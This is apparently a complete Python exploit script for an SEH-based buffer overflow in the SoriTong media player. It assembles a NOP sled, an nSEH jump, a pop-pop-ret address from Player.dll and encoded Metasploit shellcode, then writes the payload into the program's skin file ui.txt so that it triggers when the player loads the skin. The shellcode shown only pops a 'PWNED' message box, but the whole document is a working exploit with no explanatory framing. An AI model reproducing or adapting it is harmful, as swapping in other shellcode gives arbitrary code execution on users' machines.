

buf="\x90" * 584
nseh="\xeb\x06\x90\x90"
seh="\x8c\x6d\x01\x10"        #0x10016d8c : pop edi # pop esi # ret  Player.dll
# msfpayload windows/messagebox title="PWNED" text="Pwned by D4v3" R | msfencode -b "\x00\x09\x0a\x0d" -e x86/shikata_ga_nai -t c
#[*] x86/shikata_ga_nai succeeded with size 287 (iteration=1)
shellcode=("\xdd\xc0\xd9\x74\x24\xf4\xbb\xb2\x36\xad\xa7\x58\x33\xc9\xb1"
"\x42\x31\x58\x17\x83\xe8\xfc\x03\xea\x25\x4f\x52\xd3\xa1\x14"
"\x44\x97\x11\xdf\x46\x85\xe8\x68\x98\xe0\x69\x1c\xab\xc2\xfa"
"\x54\x40\xa9\x8b\x84\xd3\xeb\x7b\x3e\x9d\xd3\xf0\x76\x5a\x5c"
"\x1f\x02\x69\x3b\x1e\x3d\x72\x5a\x40\x36\xe1\xb8\xa5\xc3\xbf"
"\xfc\x2e\x87\x17\x84\x31\xc2\xe3\x3e\x2a\x99\xae\x9e\x4b\x76"
"\xad\xea\x02\x03\x06\x99\x94\xfd\x56\x62\xa7\xc1\x65\x30\x4c"
"\x01\xe1\x4f\x8c\x4d\x07\x4e\xc9\xb9\xec\x6b\xa9\x19\x25\xfe"
"\xb0\xe9\x6f\x24\x32\x05\xe9\xaf\x38\x92\x7d\xf5\x5c\x25\x69"
"\x82\x59\xae\x6c\x7c\xe8\xf4\x4a\x60\x8a\x37\x20\x90\x65\x6c"
"\xcc\x45\xfc\x4e\xa7\x0b\xb1\x40\xd4\x41\xa6\xc2\xdb\x9a\xc9"
"\x74\x66\x60\x8d\xf9\xb1\x8a\x82\x82\x5e\x6e\x37\x65\xd0\x91"
"\x48\x8a\x64\x28\xbf\x1d\x1b\xde\x9f\x9c\x8b\x2d\xd2\x30\x28"
"\x39\x67\x3e\xd5\xcb\x0f\x9c\x31\x21\x99\xfb\x6c\xca\xcc\x07"
"\x18\xf6\xbf\xbc\xb2\x54\x72\x7f\x45\x84\xa9\x2d\xa2\xd5\x4e"
"\x2e\xcd\x7d\xf5\x89\x12\x5d\x9d\x79\x04\xd3\x18\x4b\x71\x63"
"\xfe\x8f\x80\xfa\x1c\xa7\xb9\xa4\xc2\x18\xd6\x74\x47\x6d\x50"
"\x1c\x23\xad\xfe\xa5\xc3\xfd\x89\x3b\x71\xcf\xbc\x4b\x35\x0b"
"\x32\xc2\x27\x62\x9e\x86\xf4\xd4\x4c\xd9\x2b\xe7\xb0\x75\x33"
"\x5d\x39")

payload=buf+nseh+seh+shellcode

fHandle=open(r'C:\Program Files\SoriTong\Skin\Default\ui.txt','wb')
fHandle.write(payload)
fHandle.close()
